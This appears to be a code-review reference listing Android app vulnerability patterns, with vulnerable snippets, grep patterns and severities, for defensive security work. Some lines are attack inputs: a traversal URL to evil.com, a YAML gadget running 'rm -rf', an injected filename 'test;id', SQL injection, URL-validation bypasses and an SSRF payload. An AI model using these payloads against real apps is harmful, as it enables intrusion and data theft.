# Vulnerability Patterns from Real Writeups

Additional code-level patterns to look for during manual review, extracted from real CVEs and writeup collections.

## Intent Redirection (High-Critical)

**Pattern:** Exported component reads Intent from extras and forwards it.
```java
// VULN: reads attacker-controlled intent and executes it
Intent extra = getIntent().getParcelableExtra("android.intent.extra.INTENT");
startActivity(extra);  // Runs with THIS app's permissions

// Also check for:
getIntent().getParcelableExtra("extra_intent")
getIntent().getParcelableExtra("next_intent")
getIntent().getParcelableExtra("redirect")
```

**Search:**
```
getParcelableExtra.*[Ii]ntent
getParcelableExtra.*redirect
getParcelableExtra.*next
startActivity.*getParcelableExtra
```

**Severity:** Critical if target app has elevated permissions (system app, CALL_PRIVILEGED, INSTALL_PACKAGES, etc.)

## PendingIntent Vulnerabilities (High-Critical)

### Implicit PendingIntent
```java
// VULN: base intent has no explicit component
Intent base = new Intent("com.example.ACTION");  // Implicit!
PendingIntent pi = PendingIntent.getActivity(ctx, 0, base, PendingIntent.FLAG_MUTABLE);
// Attacker registers matching intent-filter, receives the PendingIntent
```

### Mutable PendingIntent with Writable Fields
```java
// VULN: FLAG_MUTABLE allows fillIn to modify intent fields
PendingIntent pi = PendingIntent.getActivity(ctx, 0, intent, PendingIntent.FLAG_MUTABLE);
// Attacker can modify: package, clipdata, component (if not set), data (if not set)
```

**Search:**
```
PendingIntent.getActivity.*FLAG_MUTABLE
PendingIntent.getBroadcast.*FLAG_MUTABLE
PendingIntent.getService.*FLAG_MUTABLE
new Intent\([^)]*\).*PendingIntent  # Implicit intent -> PendingIntent
```

## Path Traversal via URI Parsing (High)

### getLastPathSegment() Decoding
```java
// VULN: getLastPathSegment() URL-decodes, allowing ..%2F traversal
String filename = uri.getLastPathSegment();
File output = new File(downloadDir, filename);
// Attacker sends: http://evil.com/..%2F..%2F..%2Fdata%2Fdata%2F<pkg>%2Ffiles%2Fevil.so
```

### ContentProvider openFile() Traversal
```java
// VULN: no canonicalization or ".." check
public ParcelFileDescriptor openFile(Uri uri, String mode) {
    File file = new File(baseDir, uri.getPath());  // Path from attacker
    return ParcelFileDescriptor.open(file, MODE_READ_ONLY);
}
```

**Search:**
```
getLastPathSegment
new File.*uri\.getPath
new File.*uri\.getLastPathSegment
openFile.*Uri
```

## Dynamic Code Loading (Critical)

### DexClassLoader from Writable Path
```java
// VULN: loads code from external storage (world-writable)
DexClassLoader loader = new DexClassLoader(
    "/sdcard/plugins/module.dex",  // Attacker can write here
    getCodeCacheDir().getPath(), null, getClassLoader());
```

### System.loadLibrary from App Files Dir
```java
// VULN: loads .so from a path attacker can write to (via path traversal or other primitive)
System.loadLibrary("docviewer_pro");
// If lib doesn't exist in APK, Android searches app's files/native-libraries/<abi>/
// Attacker writes malicious .so there first
```

### Unity -xrsdk-pre-init-library
```java
// VULN: Unity reads "unity" extra from launching intent
// Contains command-line args, including library path for dlopen()
// String: "-xrsdk-pre-init-library /data/data/<pkg>/files/evil.so"
```

**Search:**
```
DexClassLoader
PathClassLoader
System\.loadLibrary
dlopen
Runtime\.getRuntime\(\)\.exec
-xrsdk-pre-init-library
loadClass
```

## SnakeYAML/Deserialization (Critical)

```java
// VULN: unsafe YAML loading allows arbitrary class instantiation
Yaml yaml = new Yaml();
Object obj = yaml.load(userInput);  // UNSAFE! Use yaml.safeLoad() instead

// Gadget: any class with dangerous constructor
// !!com.target.LegacyCommandUtil ["rm -rf /data/data/<pkg>/"]
```

**Search:**
```
new Yaml\(\)
yaml\.load\(
ObjectInputStream
readObject
Serializable
Parcelable.*readParcelable
```

## WebView JavaScript Bridge RCE (Critical)

```java
// VULN: JS interface method executes shell commands
@JavascriptInterface
public String getTime(String format) {
    // format comes from attacker-controlled JS
    Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "date +" + format});
}
```

**Search:**
```
@JavascriptInterface
addJavascriptInterface
Runtime\.getRuntime\(\)\.exec
ProcessBuilder
```

## Command Injection via Filenames (High)

```java
// VULN: filename concatenated into shell command
String cmd = "toybox ls " + file.getName();  // file.getName() = "test;id"
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
```

**Search:**
```
Runtime.*exec.*getName
Runtime.*exec.*getPath
ProcessBuilder.*getName
```

## Broadcast Credential Leakage (High)

```java
// VULN: credentials sent via implicit broadcast (any app can receive)
Intent intent = new Intent("com.example.action.BROADCAST");
intent.putExtra("username", user);
intent.putExtra("password", pass);
sendBroadcast(intent);  // No permission, no explicit target
```

**Search:**
```
sendBroadcast.*password
sendBroadcast.*token
sendBroadcast.*credential
sendBroadcast.*secret
sendOrderedBroadcast.*password
```

## Insecure SSL Handling (Medium-High)

```java
// VULN: proceed on SSL error (enables MITM without cert)
@Override
public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
    handler.proceed();  // Should be handler.cancel()
}
```

**Search:**
```
onReceivedSslError.*proceed
handler\.proceed
```

## Cloud Credential Exposure (High)

**Search in strings.xml and decompiled code:**
```
# AWS
AKIA[0-9A-Z]{16}
us-east-1:[0-9a-f-]{36}  # Cognito Identity Pool ID
amazonaws\.com

# Firebase
firebaseio\.com
AIzaSy[a-zA-Z0-9_-]{33}  # Firebase API key

# Google
AIza[0-9A-Za-z_-]{35}

# Generic
(api[_-]?key|secret|password|token)\s*[:=]\s*["'][^"']{8,}
```

## Exported Component Severity Assessment

When you find an exported component, assess impact based on what it can do:

| Component Behavior | Severity |
|---|---|
| Reads/returns sensitive data (credentials, PII) | Critical |
| Executes commands / loads code | Critical |
| Forwards intents (intent redirection) | Critical if app has elevated perms |
| Performs privileged actions (call, SMS, install) | Critical |
| Modifies/deletes user data | High |
| Loads arbitrary URLs in WebView with JS bridges | High |
| Returns non-sensitive data | Medium |
| Crashes (DoS) | Low-Medium |
| UI-only, no data processing | Info |

## setResult() Intent Reflection (High-Critical)

**Pattern:** Exported activity reflects incoming intent back via setResult().
```java
// VULN: passes attacker's intent (with flags) back to caller
setResult(RESULT_OK, getIntent());
// Attacker adds FLAG_GRANT_READ_URI_PERMISSION + content:// URI
// Receives URI grant on the reflected intent
```

**Search:**
```
setResult.*getIntent
setResult.*RESULT_OK.*getIntent
```

## startActivityForResult with Implicit Intent (Medium-High)

**Pattern:** App uses implicit ACTION_PICK/ACTION_GET_CONTENT and trusts the result URI.
```java
// VULN: attacker registers high-priority picker, returns file:///data/data/... URI
Intent pick = new Intent(Intent.ACTION_PICK);
pick.setType("image/*");
startActivityForResult(pick, REQUEST_CODE);
```

**Search:**
```
startActivityForResult.*ACTION_PICK
startActivityForResult.*ACTION_GET_CONTENT
startActivityForResult.*ACTION_OPEN_DOCUMENT
```

## FileProvider Wide Path Declaration (High)

```xml
<!-- VULN: exposes entire filesystem -->
<root-path name="root" path="/"/>
<!-- VULN: exposes all of external storage -->
<external-path name="external" path="."/>
```

**Search in res/xml/:**
```
root-path
external-path.*path="\.?"
```

Combined with `grantUriPermissions="true"`, any intent reflection or exported component gives full file access.

## Fragment Injection in PreferenceActivity (Medium)

```java
// VULN: instantiates Fragment from untrusted intent extra
Fragment.instantiate(context, getIntent().getStringExtra(EXTRA_SHOW_FRAGMENT), args);
```

**Search:**
```
Fragment\.instantiate
EXTRA_SHOW_FRAGMENT
isValidFragment
```

## Zip Slip (Archive Path Traversal) (High)

```java
// VULN: no path validation on zip entry name
ZipEntry entry = zipInput.getNextEntry();
File file = new File(destDir, entry.getName()); // entry.getName() could be "../../evil.so"
```

**Search:**
```
ZipEntry
ZipInputStream
getNextEntry
entry\.getName
new File.*entry
```

## Dynamic Broadcast Receiver Without Permission (High)

```java
// VULN: no permission = any app can send broadcasts to this receiver
registerReceiver(receiver, new IntentFilter("com.example.ACTION"));
// Fix: registerReceiver(receiver, filter, "com.example.permission.PRIVATE", null);
```

**Search:**
```
registerReceiver\([^,]+,\s*new IntentFilter
```

## shouldOverrideUrlLoading Return Value Bug (Medium)

```java
// VULN: returning false = WebView LOADS the URL (counterintuitive)
@Override
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    if (!isWhitelisted(request.getUrl())) {
        return false;  // BUG: should return true to block
    }
    return false;
}
```

**Search:**
```
shouldOverrideUrlLoading
```

## Dirty Stream / Share Target Path Traversal (High-Critical)

**Pattern:** App registers as ACTION_SEND target and uses provider's display name for file path.
```java
// VULN: uses display name from untrusted ContentProvider as filename
Cursor cursor = getContentResolver().query(uri, new String[]{OpenableColumns.DISPLAY_NAME}, ...);
String filename = cursor.getString(0);  // Attacker returns "../../shared_prefs/evil.xml"
File output = new File(cacheDir, filename);  // Path traversal!
```

**Search:**
```
OpenableColumns.DISPLAY_NAME
getColumnValue.*DISPLAY_NAME
ACTION_SEND
openInputStream
```

**Check AndroidManifest for share targets:**
```xml
<intent-filter>
    <action android:name="android.intent.action.SEND" />
    <data android:mimeType="*/*" />
</intent-filter>
```

## Autofill Credential Leakage (Medium)

**Pattern:** WebView login in app context where native views can receive autofill.
```java
// VULN: WebView in an activity with native EditText fields
// Autofill framework may fill both WebView and native fields
webView.loadUrl("https://login.example.com");
// If malicious app hosts this WebView, autofilled creds leak to native views
```

**Search:**
```
android:autofillHints
setImportantForAutofill
IMPORTANT_FOR_AUTOFILL
```

## Missing Touch Filtering on Sensitive UI (Medium)

**Pattern:** Sensitive activities without overlay protection.
```java
// VULN: no protection against PiP/overlay attacks
// Sensitive activity (payment, permission grant, biometric) missing:
view.setFilterTouchesWhenObscured(true);
// Or in layout XML:
// android:filterTouchesWhenObscured="true"
```

**Search for absence in sensitive activities:**
```
filterTouchesWhenObscured
FLAG_WINDOW_IS_OBSCURED
```

## OEM Debug/Factory Activities (High)

**Pattern:** Leftover debug/engineering activities exported in production builds.

**Search in manifest:**
```
debug
engineer
factory
diag
test
hidden
DevActivity
AdminActivity
```

## WebView DownloadListener Cookie Theft (High)

```java
// VULN: DownloadListener sends auth cookies with download to attacker server
webView.setDownloadListener((url, userAgent, contentDisposition, mimetype, contentLength) -> {
    DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
    request.addRequestHeader("Cookie", CookieManager.getInstance().getCookie(url));
    // Cookies sent to attacker's URL if WebView loaded attacker content
});
```

**Search:**
```
setDownloadListener
DownloadManager.Request
getCookie
addRequestHeader.*Cookie
```

## android.net.Uri Parsing Inconsistency (High-Critical)

**Pattern:** Using `android.net.Uri.parse()` for security-critical URL validation. It parses leniently and differently from WebViews/browsers.
```java
// VULN: Uri.parse("attacker.com?://victim.com/") returns host="victim.com"
// But WebView loads attacker.com
String host = Uri.parse(url).getHost();
if (host.endsWith("trusted.com")) { webView.loadUrl(url); }
```

**Search:**
```
Uri\.parse.*getHost
Uri\.parse.*getAuthority
is.*[Tt]rusted.*[Uu]rl
is.*[Vv]alid.*[Uu]rl
```

**Fix:** Use `java.net.URI` or `java.net.URL` which reject malformed input.

## Jetpack Navigation Fragment Access (Medium-High)

**Pattern:** Apps using `androidx.navigation` with exported activities allow opening ANY fragment via intent extras.
```java
// Attacker sends intent with magic extras:
// "android-support-nav:controller:deepLinkIds" = int[] of fragment IDs
// "android-support-nav:controller:deepLinkExtras" = Bundle
// NavController.handleDeepLink() processes these regardless of deep link definitions
```

**Search:**
```
NavHostFragment
NavController
navigation.*graph
androidx\.navigation
```

**Check:** If the main activity is exported and uses `NavHostFragment`, all fragments in the navigation graph are accessible.

## SharedPreferences .bak File Injection (Medium-High)

**Pattern:** Android auto-restores `.bak` files for SharedPreferences. Writing `config.xml.bak` replaces `config.xml` on next load.

**Search for file write vulns that could target shared_prefs dir:**
```
shared_prefs
SharedPreferences
getSharedPreferences
```

**If you can write arbitrary files to app's data dir:** target `shared_prefs/*.xml.bak` instead of `*.xml` to bypass existence checks.

## URL Validation Bypass Patterns (High)

Comprehensive list of URL validation weaknesses:

| Validation | Bypass | Example |
|---|---|---|
| `url.startsWith("foo.bar")` | Register `foo.bar-evil.com` | Domain prefix match |
| `url.endsWith("target.com")` | Use `evil-target.com` | Domain suffix match |
| `url.contains("target.com")` | Use `target.com.evil.com` | Substring match |
| `host.equals("target.com")` with `Uri.parse` | `evil.com?://target.com/` | Uri parsing quirk |
| `scheme == "https"` only | `javascript:alert(1)` | Missing scheme blocklist |
| Stale staging domains in whitelist | Register expired `staging.site` | Domain takeover |
| Intent-filter URI restriction | Direct component invocation | Filters are NOT security |

**Search for weak URL validation:**
```
startsWith.*http
endsWith.*\.com
contains.*\.com
equals.*host
isValidUrl
isAuthorisedURL
isTrustedUrl
```

## Mobile SSRF via Deep Link Parameters (High)

**Pattern:** Deep link parameters passed to API URL construction.
```java
// VULN: deep link param used in API URL
String user = uri.getQueryParameter("username");
String apiUrl = "https://api.target.com/users/" + user;
okHttpClient.newCall(new Request.Builder().url(apiUrl).build());
// Attacker: username=../../admin/settings%3femail=evil@gmail.com
```

**Double-slash trick:**
```java
// VULN: //attacker.com interpreted as absolute URI by OkHttp
String path = uri.getPath();  // path = "//attacker.com/data"
okHttpClient.newCall(new Request.Builder().url(baseUrl + path).build());
// OkHttp sends authenticated request to attacker.com
```

**Search:**
```
getQueryParameter.*url
getPath.*newCall
getPathSegments
baseUrl.*\+.*getPath
```

## Self-Referencing Content Provider URI (High)

**Pattern:** App's own content provider used to bypass internal URI checks.
```java
// App blocks file:///data/data/pkg/shared_prefs/...
// But allows content://pkg.notification_image_provider/...?final_path=/data/data/pkg/shared_prefs/...
// Provider's openFile() reads the final_path parameter without restriction
```

**Search:** Find content providers that accept path/query parameters pointing to files:
```
final_path
file_path
getQueryParameter.*path
openFile.*getQueryParameter
```

## ContentProvider SQL Injection (Critical)

**Pattern:** String concatenation in SQL `where` clause.
```java
// VULN: where parameter from untrusted input concatenated into SQL
db.query(TABLE, projection, "col = 1 AND (" + selection + ")", args, null);
// Attacker: selection = "1=1) UNION SELECT password FROM users--"
```

**Search:**
```
rawQuery.*\+
query.*\+.*selection
delete.*\+.*where
update.*\+.*where
execSQL.*\+
```

## Static Field Cookie/Token Persistence (High)

**Pattern:** Sensitive data stored in static Java fields persists across fragment/activity instances.
```java
// VULN: static map stores cookies, never cleared
private static ArrayMap<String, String> CUSTOM_HEADERS = new ArrayMap<>();
// LinkedIn: cookies from legitimate domain stay in map when attacker URL loads next
```

**Search:**
```
static.*Map.*[Hh]eader
static.*[Cc]ookie
static.*[Tt]oken
static.*ArrayMap
```

## URL Fragment Injection in evaluateJavascript (Critical)

**Pattern:** URL fragments (#) bypass encoding in evaluateJavascript.
```java
// VULN: url contains unencoded fragment
webView.evaluateJavascript("JSON.stringify(getEntriesByName('" + url + "'))", null);
// Attacker: url = "https://x.com/?x#',alert(1),'"
// Result: evaluateJavascript("...getEntriesByName('https://x.com/?x#',alert(1),'')...")
```

**Search:**
```
evaluateJavascript.*\+.*url
evaluateJavascript.*\+.*getIntent
loadUrl.*javascript:.*\+
```

## Unanchored Regex in URL Routing (High)

**Pattern:** Regex with `.find()` instead of `.matches()`, no `^` anchor.
```java
// VULN: Pattern.compile("(http|https)://trusted.com/path/+").matcher(url).find()
// Bypass: "https://evil.com/http://trusted.com/path/1" matches via find()
```

**Search:**
```
Pattern\.compile.*\.find\(\)
Regex.*find
matcher.*find
```

## Third-Party SDK Exported Components (Medium-High)

**Pattern:** SDKs adding exported activities to merged manifest.

**Check merged manifest (not just source):**
```bash
aapt dump xmltree app.apk AndroidManifest.xml | grep -B2 "exported.*true"
# Look for activities from SDK packages:
# com.surveymonkey, com.facebook, com.google, io.branch, com.adjust, etc.
```

**Search in decompiled manifest:**
```
com\.surveymonkey
com\.facebook.*activity
SMFeedbackActivity
```

## Split APK Hidden Attack Surface (High)

**Pattern:** Vulnerabilities in split APKs not present in base APK.
```bash
# List all APK splits for an app
adb shell pm path <package_name>
# Output: package:/data/app/.../base.apk
#         package:/data/app/.../split_config.arm64_v8a.apk
#         package:/data/app/.../split_df_miniapp.apk  <-- hidden attack surface!
```

**Decompile each split separately and check for:**
- Additional exported activities/services
- WebView handlers
- File processing utilities with disabled security checks
- Native library loading paths
